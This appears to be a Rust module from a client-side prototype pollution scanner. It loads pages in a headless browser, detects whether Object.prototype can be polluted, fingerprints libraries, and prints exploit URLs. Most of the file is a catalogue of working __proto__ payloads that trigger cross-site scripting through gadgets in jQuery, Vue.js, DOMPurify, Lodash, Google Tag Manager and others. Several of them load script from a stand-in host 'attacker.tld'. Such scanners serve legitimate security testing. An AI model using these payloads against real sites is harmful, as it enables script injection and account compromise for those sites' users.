use {
	chromiumoxide::Browser,
	colored::*,
	futures::{StreamExt, stream},
	std::sync::Arc,
	url::Url
};

use crate::{parser, payload};

const CHECK_SCRIPT: &str = "(window.ppfuzz || Object.prototype.ppfuzz) == 'reserved' && true || false";
const FINGERPRINT: &str = include_str!("fingerprint.js");

pub async fn new(urls: Vec<String>, browser: Browser, opt: parser::Options) {
	let browser = Arc::new(browser);
	let mut targets: Vec<String> = vec![];
	let mut stream = stream::iter(urls.into_iter()
		.map(|url| (url, Arc::clone(&browser)))
		.map(|(url, browser)| async move {
			let is_err: bool = false;
			let mut gadgets: Vec<String> = vec![];
			let mut detail: String = String::new();
			let page = match browser.new_page(&url).await {
				Ok(res) => res,
				Err(err) => {
					detail = err.to_string();
					return Ok((url, false, !is_err, detail, gadgets))
				}
			};
			let vuln: bool = match page.evaluate(CHECK_SCRIPT).await {
				Ok(res) => res.into_value().unwrap(),
				Err(_) => false
			};

			if vuln {
				gadgets = match page
					.evaluate(FINGERPRINT)
					.await {
						Ok(res) => {
							page.close().await.unwrap();
							res.into_value().unwrap()
						},
						Err(_) => gadgets
					};
			}

			Ok::<_, Box<dyn std::error::Error>>
			((url, vuln, is_err, detail, gadgets))
		}
	)).buffer_unordered(opt.concurrency);

	while let Some(res) = stream.next().await {
		if let Ok((ref url, vuln, is_err, detail, gadgets)) = res {
			if vuln {
				println!("[{}] {}", "VULN".green(), url);

				let payloads = payload::get();
				let mut target = Url::parse(url).unwrap();
				let mut new_target = target.clone();
				let mut queries: Vec<(_, _)> = target
					.query_pairs()
					.collect();

				for p in payloads {
					queries = queries.into_iter()
						.filter(|q| q.0 != p)
						.collect();
				}

				new_target.set_query(None);
				target = Url::parse_with_params(
					new_target.as_str(), &queries
				).unwrap();

				if !targets.iter().any(|t| t == target.as_str()) {
					fingerprint(target.to_string(), gadgets);
					targets.push(target.to_string());
				}
			} else {
				let mut msg = format!("[{}] {}", "ERRO".red(), url);
				if is_err {
					let det = format!("({})", detail);
					msg = format!("{} {}", msg, det.yellow());
				}

				eprintln!("{}", msg)
			}
		}
	}
}

fn fingerprint(target: String, gadgets: Vec<String>) {
	for gadget in gadgets.iter() {
		match gadget.as_str() {
			"Adobe Dynamic Tag Management" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[src]",
								"data:,alert(1)//"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Akai Boomerang" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[BOOMR]",
								"1"
							),
							(
								"__proto__[url]",
								"//attacker.tld/js.js"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Closure" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[* ONERROR]",
								"1"
							),
							(
								"__proto__[* SRC]",
								"1"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[CLOSURE_BASE_PATH]",
								"data:,alert(1)//"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"DOMPurify" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[ALLOWED_ATTR][0]",
								"onerror"
							),
							(
								"__proto__[ALLOWED_ATTR][1]",
								"src"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[documentMode]",
								"9"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Embedly" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[onload]",
								"alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"jQuery" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[context]",
								"<img/src/onerror=alert(1)>"
							),
							(
								"__proto__[jquery]",
								"x"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[url][]",
								"data:,alert(1)//"
							),
							(
								"__proto__[dataType]",
								"script"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[url]",
								"data:,alert(1)//"
							),
							(
								"__proto__[dataType]",
								"script"
							),
							(
								"__proto__[crossDomain]",
								""
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[src][]",
								"data:,alert(1)//"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[url]",
								"data:,alert(1)//"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[div][0]",
								"1"
							),
							(
								"__proto__[div][1]",
								"<img/src/onerror=alert(1)>"
							),
							(
								"__proto__[div][2]",
								"1"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[preventDefault]",
								"x"
							),
							(
								"__proto__[handleObj][]",
								"x"
							),
							(
								"__proto__[delegateTarget]",
								"<img/src/onerror=alert(1)>"
							)
						]
					)
					.unwrap(), gadget
				);
			},
			"js-xss" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[whiteList][img][0]",
								"onerror"
							),
							(
								"__proto__[whiteList][img][1]",
								"src"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Knockout.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[4]",
								"a':1,[alert(1)]:1,'b"
							),
							(
								"__proto__[5]",
								","
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Lodash <= 4.17.15" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[sourceURL]",
								"  alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Marionette.js / Backbone.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[tagName]",
								"img"
							),
							(
								"__proto__[src][]",
								"x:"
							),
							(
								"__proto__[onerror][]",
								"alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Google reCAPTCHA" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[srcdoc][]",
								"<script>alert(1)</script>"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"sanitize-html" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[*][]",
								"onload"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[innerText]",
								"<script>alert(1)</script>"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Segment Analytics.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[script][0]",
								"1"
							),
							(
								"__proto__[script][1]",
								"<img/src/onerror=alert(1)>"
							),
							(
								"__proto__[script][2]",
								"1"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Sprint.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[div][intro]",
								"<img src onerror=alert(1)>"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Swiftype Site Search" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[xxx]",
								"alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Tealium Universal Tag" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[attrs][src]",
								"1"
							),
							(
								"__proto__[src]",
								"//attacker.tld/js.js"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Twitter Universal Website Tag" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[attrs][src]",
								"1"
							),
							(
								"__proto__[hif][]",
								"javascript:alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Wistia Embedded Video" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[innerHTML]",
								"<img/src/onerror=alert(1)>"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Zepto.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[onerror]",
								"alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Vue.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[v-if]",
								"_c.constructor('alert(1)')()"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[attrs][0][name]",
								"src"
							),
							(
								"__proto__[attrs][0][value]",
								"xxx"
							),
							(
								"__proto__[xxx]",
								"data:,alert(1)//"
							),
							(
								"__proto__[is]",
								"script"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[v-bind:class]",
								"''.constructor.constructor('alert(1)')()"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[data]",
								"a"
							),
							(
								"__proto__[template][nodeType]",
								"a"
							),
							(
								"__proto__[template][innerHTML]",
								"<script>alert(1)</script>"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[props][][value]",
								"a"
							),
							(
								"__proto__[name]",
								"\":''.constructor.constructor('alert(1)')(),\""
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[template]",
								"<script>alert(1)</script>"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Demandbase Tag" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[Config][SiteOptimization][enabled]",
								"1"
							),
							(
								"//attacker.tld/json_cors.php?",
								"1"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Google Tag Manager/Analytics" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[customScriptSrc]",
								"//attacker.tld/xss.js"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"i18next" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[lng]",
								"cimode"
							),
							(
								"__proto__[appendNamespaceToCIMode]",
								"x"
							),
							(
								"__proto__[nsSeparator]",
								"<img/src/onerror=alert(1)>"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[lng]",
								"a"
							),
							(
								"__proto__[a]",
								"b"
							),
							(
								"__proto__[obj]",
								"c"
							),
							(
								"__proto__[k]",
								"d"
							),
							(
								"__proto__[d]",
								"<img/src/onerror=alert(1)>"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[lng]",
								"a"
							),
							(
								"__proto__[key]",
								"<img/src/onerror=alert(1)>"
							)
						]
					)
					.unwrap(), gadget
				);
			},
			"Google Analytics" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[cookieName]",
								"COOKIE=Injection;"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Popper.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[arrow][style]",
								"color:red;transition:all 1s"
							),
							(
								"__proto__[arrow][ontransitionend]",
								"alert(1)"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[reference][style]",
								"color:red;transition:all 1s"
							),
							(
								"__proto__[reference][ontransitionend]",
								"alert(2)"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[popper][style]",
								"color:red;transition:all 1s"
							),
							(
								"__proto__[popper][ontransitionend]",
								"alert(2)"
							)
						]
					)
					.unwrap(), gadget
				);
			},
			"Pendo Agent" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[dataHost]",
								"attacker.tld/js.js#"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			_ => ()
		}
	}
}

fn show_pontential(url: impl AsRef<str>, gadget: &str) {
	let gad = format!("({})", gadget);
	println!("[{}] {} {}", "INFO".blue(), url.as_ref(), gad.green());
}